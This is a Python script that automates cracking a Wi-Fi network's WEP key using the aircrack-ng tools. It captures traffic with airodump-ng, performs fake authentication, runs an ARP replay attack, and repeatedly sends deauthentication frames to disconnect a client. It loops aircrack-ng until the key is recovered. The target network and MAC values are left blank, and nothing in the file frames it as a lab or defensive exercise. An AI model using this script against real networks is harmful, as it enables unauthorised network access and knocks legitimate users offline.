import subprocess
import time

def run_command_background(cmd):
    """Run command in the background"""
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def run_command(cmd):
    """Run command and wait for it to complete, returning its output"""
    process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process.stdout, process.stderr

def crack_wep():
    """Attempt to crack WEP and return success status and output"""
    stdout, _ = run_command("sudo aircrack-ng ./wep_attack-01.cap")
    return ("KEY FOUND!" in stdout), stdout

def main():
    essid = " "
    ap_mac = " "
    your_mac = " "
    client_mac = " "
    interface = " "
    channel = " "

    # Start airodump-ng in background
    airodump_cmd = f"sudo airodump-ng {interface} --bssid {ap_mac} -c {channel} -w wep_attack"
    airodump_proc = run_command_background(airodump_cmd)

    # Perform fake authentication
    fake_auth_cmd = f"aireplay-ng -1 0 -e {essid} -a {ap_mac} -h {your_mac} {interface}"
    run_command(fake_auth_cmd)

    # Start ARP replay attack in background
    arp_replay_attack_cmd = f"aireplay-ng -3 -b {ap_mac} -h {your_mac} {interface}"
    arp_replay_proc = run_command_background(arp_replay_attack_cmd)

    # Perform initial deauth
    deauth_cmd = f"sudo aireplay-ng -0 10 -a {ap_mac} -c {client_mac} {interface}"
    run_command(deauth_cmd)

    # Attempt to crack WEP until successful
    success = False
    while not success:
        success, output = crack_wep()
        if success:
            print("Success! WEP Key Found:")
            print(output)
        else:
            print("Failed to crack WEP. Retrying...")
            # Retry deauth before next crack attempt
            run_command(deauth_cmd)
            time.sleep(10)  # Wait a bit before retrying

    # Cleanup: stop background processes
    airodump_proc.terminate()
    arp_replay_proc.terminate()

if __name__ == "__main__":
    main()
